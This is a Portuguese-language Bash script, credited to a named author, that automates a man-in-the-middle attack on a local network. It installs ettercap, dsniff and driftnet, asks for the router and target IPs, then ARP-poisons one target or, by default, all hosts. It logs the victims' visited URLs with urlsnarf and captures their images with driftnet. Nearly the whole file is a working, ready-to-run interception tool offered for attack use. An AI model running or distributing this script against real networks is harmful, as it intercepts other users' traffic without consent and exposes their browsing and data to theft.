#!/bin/bash
figlet LEIA
echo -e "Por favor, caso não esteja executando como root,"
echo -e "aconselhamos que reinicie o ataque como super-usuário.\n"
echo -e "caso seja root, desconsidere essa mensagem e tecle enter."
 read

 ###########################################aqui inicia a verificação de pacotes para instalação####################################################

echo -e "Estamos analisando os pacotes necessários...\n"
pacote=$(dpkg --get-selections | grep ettercap-text-only )
sleep 1
if [ -n "$pacote" ] ;
 then 
     echo -e "Ettercap -------------------------------------- OK\n"
 else
     echo -e "Ettercap ----------------------------- Nao instalado\n"
     echo "Será instalado pacotes de terceiros, tecle [ENTER] para continuar."
     read
     sudo apt-get install ettercap-text-only
fi
pacote=$(dpkg --get-selections | grep dsniff )
sleep 1
if [ -n "$pacote" ] ;
 then
     echo -e "Urlsnarf -------------------------------------- OK\n"
 else 
     echo -e "Urlsnarf ----------------------------- Nao instalado\n"
     echo "Será instalado pacotes de terceiros, tecle [ENTER] para continuar."
     read
     sudo apt-get install dsniff
fi
pacote=$(dpkg --get-selections | grep driftnet ) 
sleep 1
if [ -n "$pacote" ] ;
 then
     echo -e "Driftnet -------------------------------------- OK\n"
 else
     echo -e "Driftnet ----------------------------- Nao instalado\n"
     echo "Será instalado pacotes de terceiros, tecle [ENTER] para continuar."
     read
     sudo apt-get install driftnet
fi
pacote=$(dpkg --get-selections | grep figlet )
sleep 1
if [ -n "$pacote" ] ;
 then 
     echo -e "Figlet ---------------------------------------- OK\n"
 else
     echo -e "Figlet ----------------------------- Nao instalado\n"
     echo "Será instalado pacotes de terceiros, tecle [ENTER] para continuar."
     read
     sudo apt-get install figlet
fi

##################################################aqui inicia a coleta de dados para o ataque#######################################################

sleep 1
figlet MITM ATTACK
echo -e "By: Lucas Silva | Twitter: @SrSniffer\n"
echo "Deseja visualizar o IP de seu roteador s/n?"
 read v0
if [ "$v0" = s ] ;
 then 
    route -n
    echo
    echo "Digite o numero correspondente a sua interface de rede"
    echo "1- Cabeada"
    echo "2- Wireless"
    read IF
    echo "Insira o IP de seu roteador"
    read IP
    echo
    echo "OBS: Para realizar o ataque em todos os hosts tecle [ENTER]."
    echo "Insira o IP do alvo"
    read alvo
   if [ "$IF" =  2 ] ;
     then
      gnome-terminal -x bash -c "sudo ettercap -T -q -i wlan0 -M arp:remote /$IP/$alvo/; exec $SHELL";
      gnome-terminal -x bash -c "sudo urlsnarf -i wlan0; exec $SHELL";
      sudo driftnet -i wlan0
      exit
     else
      gnome-terminal -x bash -c "sudo ettercap -T -q -i eth0 -M arp:remote /$IP/$alvo/; exec $SHELL";
      gnome-terminal -x bash -c "sudo urlsnarf -i eth0; exec $SHELL";
      sudo driftnet -i eth0
      exit
   fi
else
    echo
    echo "Digite o numero correspondente a sua interface de rede"
    echo "1- Cabeada"
    echo "2- Wireless"
    read IF

    echo "Insira o IP de seu roteador"
    read IP
    echo
    echo "OBS: Para realizar o ataque em todos os hosts tecle [ENTER]."
    echo "Insira o IP do alvo,"
    read alvo
fi
if [ "$IF" =  2 ] ;
 then
   gnome-terminal -x bash -c "sudo ettercap -T -q -i wlan0 -M arp:remote /$IP/$alvo/; exec $SHELL";
   gnome-terminal -x bash -c "sudo urlsnarf -i wlan0; exec $SHELL";
   sudo driftnet -i wlan0
   exit
 else
   gnome-terminal -x bash -c "sudo ettercap -T -q -i eth0 -M arp:remote /$IP/$alvo/; exec $SHELL";
   gnome-terminal -x bash -c "sudo urlsnarf -i eth0; exec $SHELL";
   sudo driftnet -i eth0
   exit
fi